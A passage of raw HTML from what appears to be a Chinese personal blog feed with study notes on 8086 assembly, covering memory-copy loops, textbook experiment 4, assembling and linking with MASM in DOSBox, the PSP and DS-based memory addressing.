plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffH</span><br><span class="line">mov ds,ax;(ds)=0ffffH</span><br><span class="line">mov ax,0020H</span><br><span class="line">mov es,ax;(es)=0020H  , 这里的es是以多余的段，需要的时候就可以拿来用</span><br><span class="line">mov bx,0;(bx)=0,此时ds:bx指向ffff:0,es:bx指向0020:0</span><br><span class="line">mov cx,12;(cx)=12,循环12次</span><br><span class="line"></span><br><span class="line">s:mov dl,[bx];(dl)=((ds)*16+(bx)),将ffff:bx中的数据送入dl</span><br><span class="line">mov es:[bx],dl;((es)*16+(bx))=(dl),将dl的数据收纳柜如0020:bx</span><br><span class="line">inc bx;(bx)=(bx)+1</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="实验咯"><a href="#实验咯" class="headerlink" title="实验咯"></a>实验咯</h3><p>实验4</p><h4 id="（1）向内存0-2000-23f依次送入数据03f"><a href="#（1）向内存0-2000-23f依次送入数据03f" class="headerlink" title="（1）向内存0:2000:23f依次送入数据03f"></a>（1）向内存0:200<del>0:23f依次送入数据0</del>3f</h4><p>分析一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我首先想到的是用栈段依次依次的送入，但是栈中的push都是以16个字节为单位的。不能满足条件，题目是8个字节，也就是一个内存单元来放入数据。放弃这个栈段的思路</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里送入的数据是0~64也就是一步一步自增</span><br><span class="line">所以，首先找到这个内存地址，用ds:bx定位，然后用一个low寄存器从0开始依次送入，然后再递增</span><br></pre></td></tr></table></figure><p>尝试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">mov ax,0</span><br><span class="line">mov ds,ax;这里把段寄存器设置成0</span><br><span class="line">mov bx,200H;这里把偏移地址设置成200，下面在实现送入数据的同时自曾1</span><br><span class="line">mov al,0;这里是把就是向把al中的数据送入ds:bx中，因为是从0开始，所以设置成0【感觉也不需要，因为上面的ax,0】</span><br><span class="line"></span><br><span class="line">mov cx,64</span><br><span class="line">s: mov [bx],al;把al中的数据送入ds:bx中</span><br><span class="line">inc bx</span><br><span class="line">inc al</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411102853483.png" alt="image-20230411102853483"></p><h4 id="2-程序中只能使用9条指令-其中包括mov-ax-4c00h-和int-21h"><a href="#2-程序中只能使用9条指令-其中包括mov-ax-4c00h-和int-21h" class="headerlink" title="(2)程序中只能使用9条指令,其中包括mov ax,4c00h 和int 21h"></a>(2)程序中只能使用9条指令,其中包括<code>mov ax,4c00h</code> 和<code>int 21h</code></h4><p>分析一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说，这里地方就是要把上面的代码进行优化，使他只有9行</span><br></pre></td></tr></table></figure><p>emmm，看了答案才知道咋搞…它就是说要把bx和al合并一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也就是说内存是：0:200-0:23F，也就是物理地址是00200-0023f,可以把这个理解成0020:0~00</span><br></pre></td></tr></table></figure><p>写一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">mov ax,20h</span><br><span class="line">mov ds,ax;设置ds=0</span><br><span class="line"></span><br><span class="line">mov cx,64;循环64次</span><br><span class="line">mov al,0;传送的数据</span><br><span class="line"></span><br><span class="line">s:mov [al],al</span><br><span class="line">inc al</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>抄的答案不对？？</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411105420647.png" alt="image-20230411105420647"></p><p>emmm</p><p>使用寄存器间接寻址时，只可以使用 BX, BP, SI, DI 这四个寄存器中的一个，不可以使用其它寄存器。</p><p>也就是说这里的[al]是不行的</p><p>长知识了，间接寻址的时候，不能用al，只能用BX BP SI DI </p><p>重新来一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;又找到了一个答案，看看是怎么个费事</span><br><span class="line">;向内存`0:200-0:23F`依次传送数据0~63（3FH）</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">mov bx,0h</span><br><span class="line">mov ds,bx;这里ds就是0</span><br><span class="line">mov ax,200h;这一段是纯属没用的，要不要都可以</span><br><span class="line"></span><br><span class="line">mov cx,64</span><br><span class="line">s:  mov [bx+200h],bx;???在汇编里面可以用+号吗？</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411110203257.png" alt="image-20230411110203257"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411110743607.png" alt="image-20230411110743607"></p><p>实践处真道理，可以用+号</p><p>这里用debug测试了一下可以用加号</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411110928917.png" alt="image-20230411110928917"></p><h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">    mov ax,___</span><br><span class="line">    mov ds,ax;ds的地址为ax</span><br><span class="line">    mov ax,0020h</span><br><span class="line">    mov es,ax;es是20h</span><br><span class="line">    mov bx,0</span><br><span class="line">    mov cx,___</span><br><span class="line">    </span><br><span class="line">s:mov al,[bx];将ds;bx的值赋值给al</span><br><span class="line">    mov es:[bx],al;将al的值赋值给es[bx]</span><br><span class="line">    inc bx;bx++</span><br><span class="line">    loop s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这串代码是将 “mov ax, 4c00H”之前的指令复制到内存0:200处，补全程序，上级调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先，在解决两个内存之前的命令的复制的时候，需要用到2个寄存器，一个存放的是目标地址，一个存放的是原地址</span><br></pre></td></tr></table></figure><p>分析这个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">首先，我们知道的是:我们要把mov ax,4c00H之前的指令复制到内存0:200处</span><br><span class="line"></span><br><span class="line">mov ax,___</span><br><span class="line">mov ds,ax;ds的地址为ax</span><br><span class="line"></span><br><span class="line">看到这里，我们所最后所希望的是什么？</span><br><span class="line">s:mov al,[bx] ;将ds:bx的值赋值给al,这里的ds--&gt;ax</span><br><span class="line">    mov es:[bx],al ;将al的值赋值给es[bx]</span><br><span class="line">    inc bx;bx++</span><br><span class="line">    loop s</span><br><span class="line">    </span><br><span class="line">这个应该是我们所循环，也就是把命令复制过去的一个执行过程。仔细阅读</span><br><span class="line"></span><br><span class="line">也就是说，把这个命令中的内容是放入al中，然后通过al 放入0:200处【物理地址是00200】【当然我们这个地方，也可以理解成 0020:0处】【这2中写法所得到的物理地址是一样的】</span><br><span class="line"></span><br><span class="line">    mov ax,___</span><br><span class="line">    mov ds,ax;ds的地址为ax</span><br><span class="line">    mov ax,0020h</span><br><span class="line">    mov es,ax;es是20h</span><br><span class="line">    mov bx,0</span><br><span class="line">    mov cx,___</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">因为我们所需要的是:把mov ax,4c00H中的东西放到al中 然后通过al放入0:200处【也就是我们写的es:[bx]中】</span><br><span class="line">然后这里，ds:[bx]中的ds是由 ax决定 ax由我决定，所以这里ax=cs 就可以定位到ax,4c00H之前的内容</span><br></pre></td></tr></table></figure><p>问题1.复制的是什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">复制的是，你所写的代码，也就是上面给出的命令， 要将这些代码复制到0:200处</span><br><span class="line">因为复制的是命令，所以要用cs:ip</span><br></pre></td></tr></table></figure><p>问题2.复制的是什么？有多少个字节？你如何知道要复制的字节的数量？</p><p>答：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个题是 cs</span><br><span class="line">第二个空是 17H </span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230411122659855.png" alt="image-20230411122659855"></p><p>哈哈哈【不算太理解第二个空耶】</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-第一个程序（4）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-4-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-4-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-一个源程序从写出到执行的过程"><a href="#1-一个源程序从写出到执行的过程" class="headerlink" title="1.一个源程序从写出到执行的过程"></a>1.一个源程序从写出到执行的过程</h2><p>1.一个汇编语言从写出到最终执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.编写：用文本编译器，用汇编语言编写编写汇编源程序</span><br><span class="line">记事本，Nodepad++, UltraEdit</span><br><span class="line">2.编译连接</span><br><span class="line">1.使用汇编语言编译程序【MASM.EXE】对源程序文件中的源程序进行编译，生成目标文件</span><br><span class="line">2.用连接程序【LINK.EXE】对目标文件进行连接，生成可在操作系统中直接运行的可执行文件</span><br></pre></td></tr></table></figure><p>2.可执行文件包含：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.程序【从源程序中的汇编指令翻译过来的机器码】和数据【源程序中定义的数据】</span><br><span class="line">2.相关的描述信息【程序有多大，要占多少内存空间】</span><br></pre></td></tr></table></figure><p>3.执行可执行文件的程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.在操作系统中，执行可执行文件中的程序</span><br><span class="line">2.操作系统依照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化（比如：设置CS:IP指向第一条要执行的指令）然后由CPU执行程序</span><br></pre></td></tr></table></figure><h2 id="2-源程序"><a href="#2-源程序" class="headerlink" title="2.源程序"></a>2.源程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start: mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>1.汇编指令，有机器码一一对应的，被cpu’执行</p><p>2.伪指令 &gt; 给编译器看的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">segment 和 ends 是一对成对使用的伪指令，这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指令。它们的作用就是定义一个段</span><br><span class="line"></span><br><span class="line">segment 就是段的开始</span><br><span class="line">ends 就是段的结束</span><br><span class="line">一个段，需要由一个段名来标识：</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line">        段名 segment</span><br><span class="line">        段名 ends</span><br></pre></td></tr></table></figure><p>3.定义一个段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一个汇编程序是由多个段组成的，这些段用来存放代码，数据，或者被当作栈空间来使用</span><br><span class="line">2.一个由意义的汇编程序中至少要由一个段，这个段用来存放代码</span><br></pre></td></tr></table></figure><p>4.end是一个汇编程序的结束标记，end是伪指令</p><p>5.assume：假设</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">它假设某一段寄存器和程序中的某个用segment  ends定义的段相关联</span><br><span class="line">通过assume说明这种关联，在需要的情况下，编译程序将段寄存器和某一个具体的段相联系</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">总而言之：就是说assume将有特殊用途的段和相关的段寄存器相关联起来</span><br><span class="line">比如：assume cs:codesg</span><br><span class="line">就是将要用作代码段的段--&gt;codesg【这个是人为起的名字】和CPU中的段寄存器cs联系起</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230409120205822.png" alt="image-20230409120205822"></p><p>！！！重点来了</p><p>源程序文件被编译器编译过后，就编程了程序，放在可执行文件中，可执行文件就是PE的一种格式</p><p>6.标号–相当于指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.一个标号指代了一个地址</span><br><span class="line">2.codesg:放在segment的前面，作为一个段的名称，这个段的名称最终被编译连接程序处理为一个段的地址</span><br></pre></td></tr></table></figure><p>7.DOS是一个单认为操作系统</p><p>8.程序返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.我们的程序最先以汇编指令的形式存在源程序中，经编译，连接后转变为机器码，存储在可执行文件中。</span><br><span class="line">2.一个程序结束后，将CPU的控制权交还给使他得以运行的程序，这个过程就是：程序返回</span><br><span class="line">3.mov ax,4c00H</span><br><span class="line">int 21H   ； 中断机制</span><br><span class="line">这两条指令所实现的功能就是程序返回</span><br></pre></td></tr></table></figure><h2 id="3-编辑源程序"><a href="#3-编辑源程序" class="headerlink" title="3.编辑源程序"></a>3.编辑源程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">start: mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">保存到1.asp</span><br></pre></td></tr></table></figure><h2 id="4-编译"><a href="#4-编译" class="headerlink" title="4.编译"></a>4.编译</h2><p>这里我不是很会</p><p>在我的电脑上是用：dosbox </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount c d:\masm</span><br><span class="line">c:</span><br><span class="line">masm 1.asm</span><br></pre></td></tr></table></figure><p>我学汇编就只是会就好了</p><h2 id="5-连接"><a href="#5-连接" class="headerlink" title="5.连接"></a>5.连接</h2><p>连接是用link</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">具体内容可以查书</span><br></pre></td></tr></table></figure><h2 id="6-以简化的方式进行编译和连接"><a href="#6-以简化的方式进行编译和连接" class="headerlink" title="6.以简化的方式进行编译和连接"></a>6.以简化的方式进行编译和连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">就是在最后加上  ;  </span><br><span class="line"></span><br><span class="line">masm 1.asp;</span><br></pre></td></tr></table></figure><h2 id="7-exe的执行"><a href="#7-exe的执行" class="headerlink" title="7.exe的执行"></a>7.exe的执行</h2><p>执行就好了三</p><h2 id="8-谁将可执行文件中的程序装载进入内容并使他运行？"><a href="#8-谁将可执行文件中的程序装载进入内容并使他运行？" class="headerlink" title="8.谁将可执行文件中的程序装载进入内容并使他运行？"></a>8.谁将可执行文件中的程序装载进入内容并使他运行？</h2><p>首先来补充一点知识</p><p>操作系统的外壳是什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作系统，都需要提供一个称为shell的程序【用于来操作计算机系统进行工作】</span><br></pre></td></tr></table></figure><p>可执行文件中的程序装入内存并运行的原理</p><p>汇编程序从写出到执行的过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编程-&gt;1.asm-&gt;编译-&gt;1.obj-&gt;连接-&gt;1.exe-&gt;加载-&gt;内存中的程序-&gt;运行</span><br><span class="line">editmasmlinkcommandcpu</span><br></pre></td></tr></table></figure><h3 id="4-9程序执行过程的跟踪"><a href="#4-9程序执行过程的跟踪" class="headerlink" title="4.9程序执行过程的跟踪"></a>4.9程序执行过程的跟踪</h3><p>首先先写一个东西，放入2.asp中，然后使dosbox </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">masm 2.asp</span><br><span class="line">link 2.obj</span><br><span class="line">debug 2.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">fishcc:mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br><span class="line">add ax,ax</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">endfishcc</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410125716706.png" alt="image-20230410125716706"></p><p>首先在cs里面是指令的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里是000F</span><br><span class="line">说明长度是15字节</span><br></pre></td></tr></table></figure><p>在DOS系统中.exe文件中的程序加载过程如下</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410130359400.png" alt="image-20230410130359400"></p><p>我们从上面的那个dos窗口就可以发现CS的值比DS的值要大10H，在计算成段地址后*16后就相当于是大了100H也就是256个字节</p><p>这个是为什么呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上图解释得比较清楚</span><br></pre></td></tr></table></figure><p>当然我们也可以看一下这些地方都存了什么JB玩意</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410131327202.png" alt="image-20230410131327202"></p><p>这些应该就是它所说的PSP什么什么的</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410131436362.png" alt="image-20230410131436362"></p><p>这些才是我们写入的指令，也就是程序真正的指令</p><h4 id="很重要的总结"><a href="#很重要的总结" class="headerlink" title="很重要的总结"></a>很重要的总结</h4><p>1.程序加载之后，ds中存放着程序所在内存区的段地址，这个内存区的偏移地址为0，则程序所在的内存区的地址为 ds:0</p><p>2.这个内存区的前256 [100H]个字节中存放的是psp【我也不知道是什么玩意】，反正就是用来dos和程序进行通讯</p><p>3.从256字节处向后的空间存放的是程序【也就是我们写进去的东西】</p><p>4.所以我们在ds中可以得到psp的段地址SA，psp的偏移地址是0，则物理地址就是SA*16+0</p><p>5.因为PSP占256（100H）个字节，所以程序的物理地址是：SA×16+0+256=SA×16+16×16，可用段地址和偏移地址表示SA+10:0【这里是在经过化工场之前，所以是+10而不是100，在经过化工厂后它会向左偏移一位】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用u命令查看一下其他指令：</span><br><span class="line">用T命令单步执行程序中的每一条指令，并观察美条指令执行的结果</span><br><span class="line">到了int21，就需要用p命令执行</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230410132832513.png" alt="image-20230410132832513"></p><p>看到int 21 就用p【屁股一下】</p><p>我们在dos中运行 debug 1.exe的时候</p><p>是command加载debug ，debug加载1.exe<br>所以在退出的时候，要先返回debug  这个就是 p【命令】 然后返回command  这个用 q【命令】</p>]]></content>
      
      
      <categories>
          
          <category> 8086汇编 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编-寄存器-内存访问（3）</title>
      <link href="/2023/05/01/8086%E6%B1%87%E7%BC%96-3-%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89/"/>
      <url>/2023/05/01/8086%E6%B1%87%E7%BC%96-3-%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="3-1内存种字的存储"><a href="#3-1内存种字的存储" class="headerlink" title="3.1内存种字的存储"></a>3.1内存种字的存储</h2><p>1.一个内存单元的大小是1B，任何两个地址连续的内存单元，N号单元和N+1号单元，可以将他们看成两个内存单元，也可以看出一个地址为N的字单元中的高位字节单元和低位字节单元</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230406150702374.png" alt="image-20230406150702374"></p><p>**两个十六进制位是一个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0地址单元中存放的字节型数据：20H</span><br><span class="line">0地址单元中存放的字型数据：4E20H</span><br><span class="line"></span><br><span class="line">后面的是高位</span><br></pre></td></tr></table></figure><h2 id="3-2DS和-address"><a href="#3-2DS和-address" class="headerlink" title="3.2DS和[address]"></a>3.2DS和[address]</h2><p>1.CPU要读取一个内存单元的时候，必须先给出 这个单元的地址；</p><p>2.在8086CPU中，内存地址由段地址和偏移地址组成</p><p>3.8086CPU中由一个DS寄存器，通常用来存放要访问的数据的段地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CS寄存器就是当前要读取指令的地址。</span><br></pre></td></tr></table></figure><p>4.例子：我们要读取1000H单元的内容，可以用如下的程序进行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H//这里就是在bx寄存器中放入了1000H这个数据</span><br><span class="line">mov ds,bx//把bx寄存器中的1000H数据放到DS寄存器中</span><br><span class="line">mov al,[0]//[0],这里是偏移地址的意思，CPU在用到偏移地址的时候，会先去找到段地址，在第二部已经把段地址设置成1000H了，所以这句话的意思就是把地址位1000:0的数据放入al寄存器中【这个al的寄存器是ax下的一个low低位寄存器】</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line">这里不能mov dx,1000H</span><br><span class="line">只能通过通用寄存器导过来</span><br></pre></td></tr></table></figure><p>5.mov指令的功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.将数据之间送入寄存器；【不能直接放入段寄存器】</span><br><span class="line">mov ax,2</span><br><span class="line">2.将一个寄存器中的内容送入另一个寄存器中</span><br><span class="line">mov ax,bx</span><br><span class="line">【通过这种方式来送入段寄存器】</span><br><span class="line">3.将一个内存单元中的内容送入一个寄存器</span><br><span class="line">mov ax,[0]</span><br><span class="line">某个内存单元中的内容，需要用DS[address]指向这个地址后，才会送入另外一个寄存器</span><br><span class="line">也就是说，在有[]的时候是去直接读取DS和address[偏移地址]找到这个地址里面的内容，放入ax寄存器中</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 